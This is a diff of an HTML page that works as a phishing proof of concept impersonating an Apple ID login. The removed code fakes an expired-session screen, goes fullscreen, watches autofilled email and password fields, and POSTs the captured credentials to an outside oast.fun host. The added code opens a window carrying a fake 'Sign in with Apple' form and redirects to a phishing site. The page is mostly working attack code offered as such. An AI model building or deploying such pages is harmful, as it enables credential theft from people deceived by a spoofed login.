@@ -1,94 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verification Required</title>
+  <title>Secure Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
-      margin: 0;
-      font-family: -apple-system, sans-serif;
-      background: white;
-      overflow: hidden;
+      margin: 0; padding: 0;
+      width: 100vw; height: 100vh;
+      background: black;
+      color: white;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      display: flex; align-items: center; justify-content: center;
     }
 
-    .center {
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
-
-    input {
-      padding: 12px;
-      font-size: 17px;
-      width: 80%;
-      margin: 8px 0;
+    #start {
+      background: #1a73e8;
+      padding: 1em 2em;
       border-radius: 8px;
-      border: 1px solid #ccc;
-    }
-
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      background: #007aff;
+      font-size: 18px;
+      cursor: pointer;
       color: white;
       border: none;
-      border-radius: 8px;
-      margin-top: 12px;
-      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <div class="center">
-    <h2>Session expired</h2>
-    <p>You must re-login to continue apple.com.</p>
-    <button onclick="exploit()">Continue</button>
-  </div>
+  <button id="start">Login with Apple</button>
 
   <script>
-    function exfil(email, pass) {
-      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/autofill", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, pass })
-      });
-    }
+    document.getElementById('start').onclick = async () => {
+      await document.documentElement.requestFullscreen();
 
-    function monitorAutofill() {
-      const emailField = document.getElementById('email');
-      const passField = document.getElementById('pass');
+      const phishingWin = window.open("about:blank", "_blank", "noopener");
 
-      const interval = setInterval(() => {
-        const email = emailField.value;
-        const pass = passField.value;
+      phishingWin.document.write(`
+        <style>
+          html, body {
+            margin: 0; padding: 0;
+            width: 100vw; height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f2f2f7;
+          }
+          .navbar {
+            background: white;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 500;
+            box-shadow: 0 1px 0 #ccc;
+          }
+          .content {
+            padding: 20px;
+          }
+          input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            margin-top: 10px;
+          }
+          button {
+            margin-top: 20px;
+            padding: 10px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 8px;
+          }
+        </style>
+        <div class="navbar">Sign in with Apple</div>
+        <div class="content">
+          <p>Enter your Apple ID credentials</p>
+          <input type="text" placeholder="Apple ID">
+          <input type="password" placeholder="Password">
+          <button>Continue</button>
+        </div>
 
-        if (email.length > 3 && pass.length > 3) {
-          clearInterval(interval);
-          exfil(email, pass);
-        }
-      }, 300);
-    }
-
-    function exploit() {
-      document.documentElement.requestFullscreen().then(() => {
-        document.body.innerHTML = `
-          <div class="center">
-            <h2>🔒 Apple ID Login Required</h2>
-            <input id="email" type="email" autocomplete="on" placeholder="Email / Apple ID"><br>
-            <input id="pass" type="password" autocomplete="on" placeholder="Password"><br>
-            <button onclick="fakeLogin()">Login</button>
-          </div>
-        `;
-
-        monitorAutofill(); // start watching autofill after UI replaces
-      });
-    }
-
-    function fakeLogin() {
-      alert("🔐 Login failed. Please try again.");
-    }
+        <script>
+          // Delay phishing redirection to hide interstitial
+          setTimeout(() => location.replace("https://phishing-site.com/login"), 200);
+        <\/script>
+      `);
+    };
   </script>
 </body>
 </html>
